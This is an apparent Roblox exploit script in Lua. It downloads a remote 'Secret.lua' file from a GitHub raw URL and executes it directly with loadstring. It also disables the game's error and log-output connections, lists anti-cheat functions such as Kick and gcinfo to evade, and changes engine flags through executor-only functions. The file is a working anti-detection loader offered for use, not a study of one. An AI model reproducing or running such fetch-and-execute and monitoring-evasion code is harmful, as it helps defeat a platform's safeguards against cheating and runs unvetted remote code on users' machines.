repeat
    task.wait()
until game:IsLoaded()
loadstring(game:HttpGet('https://raw.githubusercontent.com/L-DATA-Vx5AZc1Bj7pm4Fx3CL39/Script/main/Secret.lua'))()

local Disables = {
    game:GetService("ScriptContext").Error,
    game:GetService("LogService").MessageOut
}

local Nos = {
    "PreloadAsync",
    "Kick",
    "kick",
    "xpcall",
    "gcinfo",
    "collectgarbage",
}

local Yes = {
    game:GetService("Players").LocalPlayer,
    game:GetService("CoreGui"),
}

for i, v in pairs(Disables) do
    for i, v in pairs(getconnections(v)) do
        v:Disable()
    end
end


if setfflag then
    setfflag("HumanoidParallelRemoveNoPhysics", "False")
    setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
end

if setfpscap then
    setfpscap(75)
end
